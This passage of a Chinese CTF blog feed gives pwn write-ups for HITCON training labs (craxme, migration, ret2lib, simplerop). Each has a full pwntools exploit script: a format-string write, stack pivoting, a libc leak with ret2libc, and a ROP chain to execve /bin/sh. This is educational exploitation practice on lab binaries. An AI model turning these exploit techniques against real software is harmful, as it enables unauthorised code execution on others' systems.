class="headerlink" title="检查保护措施"></a>检查保护措施</h3><blockquote><p><code>checksec craxme</code>:</p><p><img src="https://i.loli.net/2018/10/26/5bd2cbf09c0e6.png" alt=""></p><p>可以看到几乎所有保护措施都打开，无法通过栈溢出或者栈执行等漏洞进行攻击。</p></blockquote><h3 id="逻辑分析-1"><a href="#逻辑分析-1" class="headerlink" title="逻辑分析"></a>逻辑分析</h3><blockquote><p>像lab7一样，我们可以在ida里面看到有格式化字符串漏洞：</p><p><img src="https://i.loli.net/2018/10/26/5bd2cc3c37cec.png" alt=""></p><p>我们可以运行一下试试</p><p><img src="https://i.loli.net/2018/10/26/5bd2cb30efb76.png" alt=""></p><p>可以看到在printf函数栈中第七个位置是我们输入的内容，那么我们就可利用pwntools的fmtstr_payload来改变magic的值。</p><p>通过ida找到magic的地址：</p><p><img src="https://i.loli.net/2018/10/26/5bd2cd771b79f.png" alt=""></p><p>通过Pwntools.ELF:</p><p><img src="https://i.loli.net/2018/10/26/5bd2ce6d80f25.png" alt=""></p></blockquote><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>magicAddr <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./craxme"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"magic"</span><span class="token punctuation">]</span>inputs <span class="token operator">=</span> int<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token string">"[+]1.flag\n[+]2.craxflag\ninput:"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> inputs <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>magicAddr<span class="token punctuation">:</span> <span class="token number">0xda</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>magicAddr<span class="token punctuation">:</span> <span class="token number">0xfaceb00c</span><span class="token punctuation">}</span><span class="token punctuation">)</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./craxme"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">" :"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>运行效果：</p><p><img src="https://i.loli.net/2018/10/26/5bd2cfce6cf83.png" alt=""></p><blockquote><p>今天的格式化字符串漏洞就学到这儿啦，难受😭。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;Pwn-10月26-Hitcon-四&quot;&gt;&lt;a href=&quot;#Pwn-10月26-Hitcon-四&quot; class=&quot;headerlink&quot; title=&quot;Pwn-10月26-Hitcon-四&quot;&gt;&lt;/a&gt;Pwn-10月26-Hitcon-四&lt;
      
    
    </summary>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/categories/CTF/"/>
    
    
      <category term="Pwn" scheme="http://www.yof3ng.xyz/tags/Pwn/"/>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/tags/CTF/"/>
    
      <category term="二进制安全" scheme="http://www.yof3ng.xyz/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Pwn-10月25-Hitcon(三)</title>
    <link href="http://www.yof3ng.xyz/2018/10/25/Pwn-10%E6%9C%8825-Hitcon-%E4%B8%89/"/>
    <id>http://www.yof3ng.xyz/2018/10/25/Pwn-10月25-Hitcon-三/</id>
    <published>2018-10-25T00:54:34.000Z</published>
    <updated>2018-10-25T09:16:07.488Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="Pwn-10月25-Hitcon-三"><a href="#Pwn-10月25-Hitcon-三" class="headerlink" title="Pwn-10月25-Hitcon(三)"></a>Pwn-10月25-Hitcon(三)</h1><blockquote><p>一天一天慢慢来，😭</p></blockquote><h2 id="lab6-migration"><a href="#lab6-migration" class="headerlink" title="lab6-migration"></a>lab6-migration</h2><blockquote><p>这个题目涉及到栈迁移(stack-pivot)，在<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/stackoverflow/others/#stack-pivoting" target="_blank" rel="noopener">ctf-wiki</a>上面是有这个例题和解释的。</p><blockquote><p>该技巧就是劫持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行 ROP。一般来说，我们可能在以下情况需要使用 stack pivoting</p><ul><li>可以控制的栈溢出的字节数较少，难以构造较长的 ROP 链</li><li>开启了 PIE 保护，栈地址未知，我们可以将栈劫持到已知的区域。</li><li>其它漏洞难以利用，我们需要进行转换，比如说将栈劫持到堆空间，从而在堆上写 rop 及进行堆漏洞利用</li></ul><p>此外，利用 stack pivoting 有以下几个要求:</p><ul><li>可以控制程序执行流。</li><li>可以控制 sp 指针。一般来说，控制栈指针会使用 ROP，常见的控制栈指针的 gadgets 一般是</li></ul><pre class=" language-assembly"><code class="language-assembly">pop rsp/esp</code></pre></blockquote><p>在这题中，溢出长度不够导致无法一次性构造ropchain，并且还限制了main函数溢出的次数。</p></blockquote><h3 id="检查保护措施"><a href="#检查保护措施" class="headerlink" title="检查保护措施"></a>检查保护措施</h3><blockquote><p><code>checksec migration</code></p><p><img src="https://i.loli.net/2018/10/25/5bd172b663166.png" alt=""></p><p>开启了NX。</p></blockquote><h3 id="逻辑分析"><a href="#逻辑分析" class="headerlink" title="逻辑分析"></a>逻辑分析</h3><blockquote><p>ida 里面看一看：</p><p><img src="https://i.loli.net/2018/10/25/5bd1738bc3bfe.png" alt=""></p><p>buf大小为0x28 = 40字节，而read读取0x40 = 64字节</p><p>gdb跑一下，看看具体情况：</p><p><img src="https://i.loli.net/2018/10/25/5bd17674836d1.png" alt=""></p><p>也就是说有4个字节被读取到EBP中，剩下20个溢出字节可以用来构造ropchain。</p><p>搜索一下可用的gadget：</p><p><img src="https://i.loli.net/2018/10/25/5bd18186ce41f.png" alt=""></p></blockquote><h3 id="构造exp"><a href="#构造exp" class="headerlink" title="构造exp"></a>构造exp</h3><p>exp：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token comment" spellcheck="true"># -*- coding:utf-8 -*-S</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./migration'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./migration"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/i386-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>system_libc <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"system_libc:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>system_libc<span class="token punctuation">)</span>read_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"read_plt:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"puts_got:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"puts_plt:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span>puts_libc <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"puts_libc:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts_libc<span class="token punctuation">)</span>binsh_libc<span class="token operator">=</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"binsh_libc:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>binsh_libc<span class="token punctuation">)</span>leave_ret <span class="token operator">=</span> <span class="token number">0x08048418</span>p3ret <span class="token operator">=</span> <span class="token number">0x08048569</span> <span class="token comment" spellcheck="true">#pop esi ; pop edi ; pop ebp ; ret</span>p1ret <span class="token operator">=</span> <span class="token number">0x0804836d</span> <span class="token comment" spellcheck="true">#pop_ebp_ret</span>buf1 <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x500</span>buf2 <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x400</span>payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">40</span><span class="token comment" spellcheck="true"># buf1 为ebp，eip ==> read_plt ==> leave_ret为返回地址 ==>read(0,buf1,0x100)</span>payload <span class="token operator">+=</span>p32<span class="token punctuation">(</span>buf1<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>buf1<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#leave;ret ==> mov ebp,esp; pop ebp; ret;</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">" :\n"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#通过之前的leave_ret，将buf2作为ebp，得到puts_addr,通过libc泄露得到binsh，system_addr</span>payload<span class="token operator">=</span>p32<span class="token punctuation">(</span>buf2<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>p1ret<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>buf2<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>puts_addr <span class="token operator">=</span>u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"puts_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span>offset <span class="token operator">=</span> puts_addr <span class="token operator">-</span> puts_libcsystem_addr <span class="token operator">=</span> system_libc <span class="token operator">+</span> offsetbinsh <span class="token operator">=</span> binsh_libc <span class="token operator">+</span>offset<span class="token triple-quoted-string string">'''payload =p32(buf1)+p32(read_plt)+p32(p3ret)+p32(0)+p32(buf1)+p32(0x100)+p32(system_addr)+p32(0xdeadbeef)+p32(buf1)p.send(payload)sleep(0.1)#p.send("/bin/sh\0")p.interactive()'''</span><span class="token comment" spellcheck="true">#懵逼栈</span>payload <span class="token operator">=</span>p32<span class="token punctuation">(</span>buf1<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"bbbb"</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>exp运行效果：<img src="https://i.loli.net/2018/10/25/5bd17a3f8c896.png" alt=""></p><blockquote><p>这题伪造假栈帧，从而构造ropchain，简直就是一场消化盛宴，我需要好好消化一下lab6。</p><p>今天还看了一下安恒一周年特别赛的一道pwn题–over，做一半发现只能控制ebp和eip？？？没想到是安恒杯六月赛的一道原题，在ctf-wiki的花式栈溢出技巧里面有，并且和lab6一样也是通过控制ebp和eip来做，但是那题并没有多出来的溢出字节。</p><p>总的来说，两种都可以称作伪造假栈帧：<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/others/#_6" target="_blank" rel="noopener">CTF-WIKI-花式栈溢出</a>。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;Pwn-10月25-Hitcon-三&quot;&gt;&lt;a href=&quot;#Pwn-10月25-Hitcon-三&quot; class=&quot;headerlink&quot; title=&quot;Pwn-10月25-Hitcon(三)&quot;&gt;&lt;/a&gt;Pwn-10月25-Hitcon(三
      
    
    </summary>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/categories/CTF/"/>
    
    
      <category term="Pwn" scheme="http://www.yof3ng.xyz/tags/Pwn/"/>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/tags/CTF/"/>
    
      <category term="二进制安全" scheme="http://www.yof3ng.xyz/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Pwn-10月24-Hitcon(二)</title>
    <link href="http://www.yof3ng.xyz/2018/10/24/Pwn-10%E6%9C%8824-Hitcon-%E4%BA%8C/"/>
    <id>http://www.yof3ng.xyz/2018/10/24/Pwn-10月24-Hitcon-二/</id>
    <published>2018-10-24T04:45:45.000Z</published>
    <updated>2018-11-02T14:21:09.216Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="Pwn-10月24-hitcon-二"><a href="#Pwn-10月24-hitcon-二" class="headerlink" title="Pwn-10月24-hitcon(二)"></a>Pwn-10月24-hitcon(二)</h1><blockquote><p>继续hitcon的解题之路。</p></blockquote><h2 id="lab4-ret2lib"><a href="#lab4-ret2lib" class="headerlink" title="lab4 - ret2lib"></a>lab4 - ret2lib</h2><blockquote><p>拿到题目看题目名，和lab3的ret2sc差不多，这个应该是return to libc，也是一种攻击手法。泄露libc并且leak出libc基地址，从而getshell？😄</p></blockquote><h3 id="检查保护措施"><a href="#检查保护措施" class="headerlink" title="检查保护措施"></a>检查保护措施</h3><blockquote><p><code>checksec ret2lib</code>:</p><p><img src="https://i.loli.net/2018/10/24/5bcffda0c6f43.png" alt=""></p></blockquote><h3 id="逻辑分析"><a href="#逻辑分析" class="headerlink" title="逻辑分析"></a>逻辑分析</h3><blockquote><p>简单跑一下：</p><p><img src="https://i.loli.net/2018/10/24/5bd0000628c22.png" alt=""></p><p>程序让我们输入一个地址，以整型的形式输入，然后它会返回这个地址存有的内容给我们，然后让我们<code>leave some message</code>，并且打印出来，我们可以通过这个功能从GOT表中将一些函数的真实地址打印出来，然后通过libc文件中函数的偏移量计算基地址，例如将某一个函数的GOT条目的地址传给write函数，就可以泄漏这个函数在进程空间中的真实地址，<strong>GOT表中所存的puts函数的地址便是在ret2lib进程中的实际地址。</strong></p><p>IDA里面看看：</p><p><img src="https://i.loli.net/2018/10/24/5bd003fbb31e4.png" alt=""></p><p>通过命令<code>readelf -V ret2lib</code>可以查到其libc库版本为<code>libc.so.6</code>：</p><p><img src="https://i.loli.net/2018/10/24/5bd009e18b194.png" alt=""></p><p>通过pwntools的elf模块我们可以链接该libc.so.6库，简单看看里面的函数地址：</p><p><img src="https://i.loli.net/2018/10/24/5bd00c1190711.png" alt=""></p><p>同样针对这题可以使用IDA <code>alt + t</code>来查找GOT表puts地址，也可通过上述ELF模块链接ret2lib程序，通过<code>elf.got[&#39;puts&#39;]</code>来获取GOT表中puts条目地址:</p><p><img src="https://i.loli.net/2018/10/24/5bd00d4fb5348.png" alt=""></p><p><img src="https://i.loli.net/2018/10/24/5bd00d70f16de.png" alt=""></p><p>将134520860作为我们需要获得内容的地址输入程序：</p><pre class=" language-bash"><code class="language-bash">Do you know <span class="token keyword">return</span> to library ?<span class="token comment" spellcheck="true">###############################</span>What <span class="token keyword">do</span> you want to see <span class="token keyword">in</span> memory?Give me an address <span class="token punctuation">(</span>in dec<span class="token punctuation">)</span> :134520860                                           The content of the address <span class="token keyword">:</span> 0xf7639250</code></pre><p>然后我们就得到了puts函数条目在存在GOT表中的内容，即<strong>此次</strong>程序运行时puts函数的真实地址<code>0xf7639250</code>。</p><p>libc基地址计算：<strong>libcbase_addr = puts_addr - libc_puts = 0xf7639250 - 0x67250 = 0xf75d2000</strong></p><p>这里我只是简单的展示一下计算方法，实际上在程序运行过程中libc的<strong>基地址是会发生变化的</strong>，所以不能提前计算好基地址，再写exp，要在exp里面计算基地址，这样就不会出错。</p><p>既然已经可以计算出system函数的地址了，那么我们就需要找一个sh，可以寻找binary程序本身中的字符串，也可以使用libc中的：</p><p><img src="https://i.loli.net/2018/10/24/5bd012dbb4bb5.png" alt=""></p><p>然后我们可以通过Print_message()函数溢出，覆盖EIP的值使其跳转执行system函数：</p><p><img src="https://i.loli.net/2018/10/24/5bd017ba13b3e.png" alt=""></p><p><img src="https://i.loli.net/2018/10/24/5bd018a67369c.png" alt=""></p><p>可以看到padding长度为60，接下来写exp即可.</p></blockquote><h3 id="构造exp"><a href="#构造exp" class="headerlink" title="构造exp"></a>构造exp</h3><blockquote><p>libcbase_addr = puts_addr - libc_puts</p><p>system_addr = libcbase_addr + libc.symbols[‘system’]</p><p>return_addr = ‘anything’</p><p>exp:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./ret2lib"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./ret2lib"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/i386-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>libc_puts <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">" :"</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">" : "</span><span class="token punctuation">)</span>libcbase_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc_putsreturn_addr <span class="token operator">=</span> <span class="token number">0x0804857D</span> <span class="token comment" spellcheck="true">#main函数地址</span>success<span class="token punctuation">(</span><span class="token string">"libcbase_addr -> {:#x}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>libcbase_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> libcbase_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span>cyclic<span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">,</span> system_addr<span class="token punctuation">,</span> return_addr<span class="token punctuation">,</span> next<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"sh\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#sh\x00是因为可能匹配到其他字符串，从而加个截断</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">" :"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></blockquote><p>运行效果：</p><p><img src="https://i.loli.net/2018/10/24/5bd01b3e9b344.png" alt=""></p><h2 id="lab5-simplerop"><a href="#lab5-simplerop" class="headerlink" title="lab5-simplerop"></a>lab5-simplerop</h2><blockquote><p>simplerop ==&gt; easyrop ==&gt; babyrop?经历绝望的过程😭，又是一个构造ropchain的题目。</p></blockquote><h3 id="检查保护措施-1"><a href="#检查保护措施-1" class="headerlink" title="检查保护措施"></a>检查保护措施</h3><blockquote><p><code>checksec ./simplerop</code></p><p><img src="https://i.loli.net/2018/10/24/5bd02cfbed61f.png" alt=""></p><p>开启了NX，栈不可执行防护。</p></blockquote><h3 id="逻辑分析-1"><a href="#逻辑分析-1" class="headerlink" title="逻辑分析"></a>逻辑分析</h3><blockquote><p>通过ida看看：</p><p><img src="https://i.loli.net/2018/10/24/5bd037bdc39d0.png" alt=""></p><p>逻辑十分简单，就溢出然后构造rop chain，通过gdb动态调试得到溢出点，padding为32：</p><p><img src="https://i.loli.net/2018/10/24/5bd0380835b4e.png" alt=""></p><p>但是这个题型貌似叫：<code>ret2systemcall</code>，此程序中既无system函数，也无/bin/sh字符串，还是静态编译，新姿势 ==&gt;rop chain后 int 0x80中断从而执行系统调用==&gt; <code>execve(/bin/sh)</code>。</p><p><strong>原理：通过一系列 pop|ret 等gadget，使得 eax = 0xb（execve 32 位下的系统调用号），ebx -&gt; /bin/sh， ecx = edx = 0，然后通过 <code>int 0x80</code> 实现系统调用，执行 execve(“/bin/sh”, 0, 0)</strong></p><p><img src="https://i.loli.net/2018/10/24/5bd03efc07ec3.png" alt=""></p></blockquote><p>不知道为啥我的ROPgadget查不到我们想要的gadget。</p><h3 id="构造exp-1"><a href="#构造exp-1" class="headerlink" title="构造exp"></a>构造exp</h3><blockquote><p>exp:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>  p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./simplerop'</span><span class="token punctuation">)</span>  elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./simplerop'</span><span class="token punctuation">)</span>  pop_edx_ecx_ebx <span class="token operator">=</span> <span class="token number">0x0806eca0</span>  pop_eax <span class="token operator">=</span> <span class="token number">0x080b7e26</span>  pop_edx <span class="token operator">=</span> <span class="token number">0x0806ec7a</span>  int_80 <span class="token operator">=</span> <span class="token number">0x0806c8f5</span>  gadget <span class="token operator">=</span> <span class="token number">0x080707b9</span> <span class="token comment" spellcheck="true"># mov word ptr [edx],eax  </span>bss <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>  read_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>  p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>  payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">32</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>pop_edx<span class="token punctuation">)</span> <span class="token operator">+</span>p32<span class="token punctuation">(</span>bss<span class="token punctuation">)</span><span class="token operator">+</span> p32<span class="token punctuation">(</span>pop_eax<span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">"/bin"</span><span class="token operator">+</span> p32<span class="token punctuation">(</span>gadget<span class="token punctuation">)</span>  payload <span class="token operator">+=</span>  p32<span class="token punctuation">(</span>pop_edx<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bss<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>pop_eax<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"/sh\x00"</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>gadget<span class="token punctuation">)</span>  payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_edx_ecx_ebx<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bss<span class="token punctuation">)</span> payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_eax<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xb</span><span class="token punctuation">)</span>  payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>int_80<span class="token punctuation">)</span>  p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>  p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></blockquote><p>运行效果：</p><p><img src="https://i.loli.net/2018/10/24/5bd043f350073.png" alt=""></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>内容涉及: libc泄露，leak libc基地址，ropchain系统调用（int 0x80）。</p><p>ropchain系统调用原理：在无system函数，/bin/sh可用的情况下，通过一系列 pop|ret 等gadget，使得 eax = 0xb（execve 32 位下的系统调用号），ebx -&gt; /bin/sh， ecx = edx = 0，然后通过 <code>int 0x80</code> 实现系统调用，执行 execve(“/bin/sh”, 0, 0)。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;Pwn-10月24-hitcon-二&quot;&gt;&lt;a href=&quot;#Pwn-10月24-hitcon-二&quot; class=&quot;headerlink&quot; title=&quot;Pwn-10月24-hitcon(二)&quot;&gt;&lt;/a&gt;Pwn-10月24-hitcon(二
      
    
    </summary>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/categories/CTF/"/>
    
    
      <category term="Pwn" scheme="http://www.yof3ng.xyz/tags/Pwn/"/>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/tags/CTF/"/>
    
      <category term="二进制安全" scheme="http://www.yof3ng.xyz/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Pwn-10月23-Hitcon(一)</title>
    <link href="http://www.yof3ng.xyz/2018/10/23/Pwn-10%E6%9C%8823-Hitcon-%E4%B8%80/"/>
    <id>http://www.yof3ng.xyz/2018/10/23/Pwn-10月23-Hitcon-一/</id>
    <published>2018-10-23T10:52:55.000Z</published>
    <updated>2018-10-23T14:25:36.272Z</updated>
    
